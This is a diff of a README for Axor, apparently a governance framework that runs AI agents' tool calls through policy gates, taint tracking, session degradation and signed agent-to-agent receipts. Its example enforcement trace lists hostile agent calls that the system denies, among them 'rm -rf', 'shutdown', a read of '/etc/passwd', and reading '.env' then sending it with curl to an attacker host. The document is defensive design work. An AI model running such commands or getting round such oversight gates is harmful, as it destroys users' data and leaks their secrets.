@@ -58,25 +58,31 @@ Governance is not an adapter. It's a layer.
 
 Raw agent execution is high-entropy. Agents trend toward unrestricted execution: accumulate context, expand scope, request more tools, spawn additional agents, export excessive state.
 
-Axor applies policy membranes between agent intent and actual execution. Only execution that passes policy constraints survives.
+Axor applies policy membranes between agent intent and actual execution. Only execution that passes every gate survives. Each gate is a structural check; a deny at any gate is final.
 
 ```
-Raw Agent Intent
+Raw Agent Intent (a tool call)
        ↓
-  ToolInterceptor      ← rule-based, runs first, unconditional
+  Capability        ← is the tool allowed by the active policy at all?
        ↓
-  ReputationEnricher   ← cross-session resource reputation (axor-sentinel)
+  Consequence       ← how irreversible is the ACTION class? (content-blind)
        ↓
-  Phase 1 Rule         ← reputation ≥ 0.8 + external read → deterministic deny
+  Value policies    ← decidable predicates on arguments (amount in range, …)
        ↓
-  AnomalyDetector      ← behavioral sequence scoring, pluggable
+  Degradation       ← has the session narrowed its own surface?
        ↓
-  Isolated Verifier    ← canonical features only, no raw strings
+  Positional        ← declared sinks: admit only instruction-incomplete FORMS
        ↓
- Approved Execution
+  Carrier           ← untrusted free text into an instruction-following sink?
+       ↓
+  Per-value taint   ← integrity (untrusted→high-risk) + confidentiality floor
+       ↓
+  Adjudicator       ← optional advisory second opinion (tightening-only)
+       ↓
+ Approved Execution → register the output's provenance for later calls
 ```
 
-Minimum sufficient permeability: the smallest capability surface required for task completion.
+Detection (reputation / anomaly / drift) runs **alongside** this, observe-only — it informs humans and may opt-in *tighten* degradation, but it never returns an allow and never sits on the gate path. Minimum sufficient permeability: the smallest capability surface required for task completion.
 
 Axor does not maximize agent freedom. It maximizes useful execution per unit of allowed capability.
 
@@ -101,19 +107,22 @@ Governance enforcement trace — same agent, no prompt changes:
 
 ```
 tool_use: bash("rm -rf ./dist")
-→ DENIED   ToolInterceptor   bash not in capabilities(focused_generative)
+→ DENIED   capability        bash not in policy(focused_generative)
+
+tool_use: bash("shutdown -h now")
+→ DENIED   consequence       catastrophic action class exceeds unattended ceiling
 
 spawn_child(depth=4)
-→ DENIED   TopologyPolicy    max_child_depth=1 for moderate task
-
-context_expand(scope="repo")
-→ REDUCED  ContextView(3 files, 1 840 tokens)  from 24 files
+→ DENIED   capability        max_child_depth=1 for this task
 
 tool_use: read("../../../etc/passwd")
-→ DENIED   LeaseValidator    path outside allowed_paths after normalization
+→ DENIED   path ceiling      outside allowed_paths after resolution
+
+read(".env") → curl("https://attacker.example", body=…)
+→ DENIED   confidentiality   egress refused — a secret read is outstanding
 
 export(include_reasoning=True)
-→ FILTERED ExportFilter      mode=summary_only
+→ FILTERED export filter      mode=summary
 
 task: completed within governed execution envelope
 ```
@@ -124,47 +133,43 @@ Denied capabilities are intercepted before reaching the executor. Context is sco
 
 ## How Enforcement Works
 
-Axor enforces policy at three independent layers. A deny at any layer is final — later layers cannot override it.
+Every tool call runs through the gate sequence above. A deny at any gate is final — nothing downstream can turn it back into an allow. Two ideas carry most of the weight:
 
-**Layer 1 — Rule-Based Interception.** Every tool call is evaluated against the active policy before execution. Synchronous, unconditional. A Layer 1 deny cannot be overridden by Layer 2 or 3.
+**Per-value provenance, not a session flag.** Integrity (could this value carry untrusted influence?) and confidentiality (could it carry a secret we read?) are tracked on each *value's own* provenance — so a clean value stays usable even after the session has touched untrusted data elsewhere. The two axes are handled asymmetrically: integrity is precise per-value; confidentiality rides a sound, paraphrase-proof session floor (once a secret is read, egress is refused until a governance endorsement, regardless of how the outgoing value is encoded).
 
-**Layer 2 — Behavioral Anomaly Scoring.** After Layer 1 approves, the execution *sequence* is evaluated — not just the individual call. Pluggable via `axor-classifier-simple` (scikit-learn, zero tokens) or `axor-classifier-llm`.
+**Structure over content where it counts.** The carrier and positional gates read the *form* of a value, never its meaning — so a paraphrase that hides an injection cannot defeat them. A high-stakes sink whose legitimate input cannot encode an instruction (a closed schema, an enum, a number) is admitted only when the value's form is instruction-incomplete; exec-class sinks, whose input is instruction-complete by definition, cannot be declared this way and stay on content-based tracking.
 
-**Layer 3 — Isolated Intent Verification.** Gray-zone intents reach an LLM verifier — but only as canonical behavioral features. Raw strings (task text, file paths, tool arguments) are stripped by `IntentCanonicalizer` before the verifier sees anything. A prompt injection in a file path cannot influence a governance decision.
-
-**DegradationEngine — Source-Aware Session Degradation.** Running in parallel with the cascade, the `DegradationEngine` converts accumulated denial signals and taint metadata into a session-level `DegradationLevel` that progressively narrows the capability surface. Unlike a simple "N denials → restrict" counter, degradation is **source-aware**: a malicious document quarantines its origin; clean sources in the same session continue at reduced but functional capability. Only when session-level thresholds are crossed does the whole session degrade.
+**Degradation — a one-way tightening.** Running alongside the gates, degradation converts denied dangerous calls and quarantined sources into a session level that narrows the surface. It is **source-aware** (a malicious document quarantines its origin; clean sources continue), **monotone** (never decreases on its own), and **fact-driven** (structural booleans, not counters or scores).
 
 | Level | Effect |
 |-------|--------|
 | `NORMAL` | Baseline — full policy in effect |
-| `CAUTIOUS` | Triggering document soft-blocked from context |
-| `RESTRICTED` | Quarantined source blocked; write/bash/export removed for tainted calls |
+| `CAUTIOUS` | Triggering source soft-blocked from context |
+| `RESTRICTED` | Quarantined source blocked; write/bash/export removed for its calls |
 | `LOCKED` | All tools frozen; only `read` + `escalate` permitted; export forced `RESTRICTED` |
 | `TERMINAL` | Session stopped; `SessionTerminatedError` raised on next intent |
 
-Degradation level is monotonically increasing — it never decreases without explicit `GovernanceAuthority` clearance (same authority as `TaintEngine.clear_by_governance`).
+The only way down is an explicit `GovernanceAuthority` clearance — a worker path cannot lower it.
 
-See [docs/reverse-osmosis.md](docs/reverse-osmosis.md) for the full enforcement model, taint propagation semantics, and adversarial test coverage.
+See **[docs/governance-model.md](docs/governance-model.md)** for the complete model and the guarantees in one place.
 
 ---
 
 ## Defense System
 
-Axor composes three complementary defense layers across different time horizons.
+Enforcement and detection are kept strictly separate.
 
-**Per-intent — Core enforcement cascade.** Every tool call passes through the three-layer cascade (rule-based interception → behavioral anomaly scoring → isolated intent verification) plus the `DegradationEngine`. Operates within a single session, evaluated on every intent before execution.
+**Enforcement (core).** The gate sequence above plus degradation. Driven entirely by *structural facts* — capability, action class, value form, value provenance. This is the only thing that can deny a call. Evaluated on every intent before execution.
 
-**Cross-session — [`axor-sentinel`](../axor-sentinel/README.md).** Maintains a resource reputation graph across all sessions. A slow-and-low staging attack — exfiltration spread across dozens of individually normal short sessions — never exceeds any single-session threshold, but saturates reputation scores over time. When a high-reputation resource is accessed, the `SnapshotIntentEnricher` populates `NormalizedIntent.target_resource_reputation`; the `IntentLoop` denies deterministically at Phase 1, before any LLM inference.
-
-**Behavioral drift — [`axor-probe`](../axor-probe/README.md).** Detects context-induced reasoning drift while a session is running. Captures a read-only snapshot, executes behavioral probes out-of-band against a shadow instance and an isolated baseline, and emits a `DriftSignal`. The live session is never touched. Significant drift signals (`ELEVATED_REVIEW` or calibrated `RESTRICTED_MODE`) feed into core and sentinel.
+**Detection — observe-only.** Reputation ([`axor-sentinel`](../axor-sentinel/README.md), a cross-session resource-reputation graph that catches slow-and-low staging) and behavioural drift ([`axor-probe`](../axor-probe/README.md), out-of-band shadow-instance comparison) are **telemetry**. They never return an allow/deny and never sit on the gate path — a poisoned reputation score cannot, by itself, cause an action. The single opt-in exception: a reputation reading *crossing a registered threshold* is a decidable fact that may **tighten** degradation (never loosen, never allow), per-tenant isolated.
 
 ```
-Per-intent     enforcement cascade (core)              ← every intent, synchronous
-Cross-session  resource reputation graph (sentinel)    ← hourly background audit cycle
-Behavioral     shadow instance comparison (probe)      ← out-of-band, no hot-path impact
+Enforcement   structural gates + degradation (core)    ← every intent, decides allow/deny
+Detection     reputation graph (sentinel)              ← observe-only; may opt-in tighten
+Detection     shadow-instance drift (probe)            ← observe-only, out-of-band
 ```
 
-These layers fail independently: a probe bypass does not disable the enforcement cascade; a gap in sentinel's reputation graph does not disable per-intent rule enforcement.
+This is the load-bearing separation: enforcement is a deterministic function of facts; detection informs humans and may only ratchet restrictions. A probe bypass or a gap in the reputation graph cannot disable the gates.
 
 ---
 
@@ -221,14 +226,25 @@ Every child agent is a `GovernedNode` — not a raw sub-agent.
 
 ```
 executor yields spawn_child
-  → IntentLoop intercepts before CapabilityExecutor
-  → child policy validated against parent ceiling
-  → child inherits parent taint state
-  → child context = scoped slice of parent context
+  → intercepted before execution; the spawn task runs the carrier/taint gate
+  → child policy validated against the parent ceiling
+  → child inherits the parent's per-value provenance (cannot launder it)
+  → child context = scoped slice of the parent context
   → child runs under its own governed envelope
+  → child output re-minted untrusted in the parent (or restored, under federation)
 ```
 
-Child capabilities cannot exceed the parent's. Child taint cannot be laundered. Child tokens roll up to the parent budget. `session.total_tokens_spent()` always reflects the full spawn tree. Child nodes share the parent's `DegradationEngine` instance — a child cannot start below the parent's current `DegradationLevel` (invariant D-6).
+Child capabilities cannot exceed the parent's. Child tokens roll up to the parent budget — `session.total_tokens_spent()` always reflects the full spawn tree. Child nodes share the parent's degradation state, so a child cannot start below the parent's current level. A child's returned output is, by default, re-minted **untrusted** in the parent — a child cannot launder a value it read by returning it.
+
+### Agent-to-agent trust (federation)
+
+Opt in, and a value arriving from another agent carries a **signed receipt** attesting its provenance. The kernel decides on arrival:
+
+- valid receipt from an authenticated peer on a compatible kernel in a federated domain → **restore** the peer's provenance (trust its labels);
+- authentic receipt but incompatible kernel / non-federated domain → **re-mint untrusted**;
+- forged, tampered, or unknown-peer receipt → **reject** the value outright.
+
+Restoring provenance is the only place an external claim can *raise* trust, and it is gated on cryptography (HMAC by default, ed25519 optional) plus explicit configuration. With federation on, in-process children become same-kernel peers and their actual provenance is restored instead of being blanket-untrusted. A reference transport ships for runnable cross-process A2A; swap it for HTTP/gRPC with no other change.
 
 ```
 depth=1   GovernedNode
@@ -247,20 +263,24 @@ depth=3   GovernedNode
 ```
 axor_core/
 ├── contracts/      Pure contracts — no business logic, no side effects
-├── node/           Governance boundary: interception, canonicalization, export
+├── node/           Governance boundary: the gate sequence, canonicalization, export
 ├── capability/     Tool permission derivation, execution, lease validation
-├── taint/          TaintEngine — sticky propagation, source tracking, clearance audit
-├── degradation/    DegradationEngine — source-aware session degradation state machine
-├── policy/         Dynamic policy selection — heuristic + external classifier
+├── taint/          Per-value provenance — causal roots, content-derivation ledger,
+│                   confidentiality floor, governance release
+├── kernel/         The decidability classifier, projection registration, the advisory
+│                   adjudicator
+├── federation/     Agent-to-agent trust — signed receipts, gateway, transport
+├── degradation/    Source-aware, monotone session degradation state machine
+├── policy/         Policy selection + consequence axis + value-policy predicates
 ├── context/        Session-scoped context: compression, cache, selection
-├── budget/         Token accounting across full spawn tree
+├── budget/         Token accounting across the full spawn tree
 ├── trace/          Decision trace collection and access control
-├── worker/         GovernedSession, SlashCommandRouter, Dispatcher
+├── worker/         GovernedSession — the public entry point
 └── errors/         GovernanceBypassError, TaintClearanceError, DegradationClearanceError,
                     SessionTerminatedError, SpawnValidationError
 ```
 
-See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the full module tree and design invariants.
+See **[docs/governance-model.md](docs/governance-model.md)** for the model and guarantees, and [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the module tree and pipeline.
 
 ---
 
@@ -324,15 +344,20 @@ pip install axor-classifier-simple[ml]  # ML task signal classifier + anomaly de
 pip install axor-classifier-llm[llm]    # LLM gray-zone verifier (requires Anthropic SDK)
 ```
 
+Asymmetric (ed25519) federation receipt signing is optional too — `pip install axor-core[federation]`. The default HMAC signer needs nothing.
+
 `axor-core` has **zero required dependencies** by design.
 
+From source:
+
+```bash
 cd axor-core
 python -m venv .venv && source .venv/bin/activate
 pip install -e ".[dev]"
 pytest tests/ -q
 ```
 
-The CI security gate enforces minimum adversarial variant counts per category. Dropping below minimums fails the build.
+The CI security gate runs the adversarial and invariant suites on every PR, across a fixed and several rotated hash seeds, so the structural soundness cannot depend on iteration order.
 
 ---
 
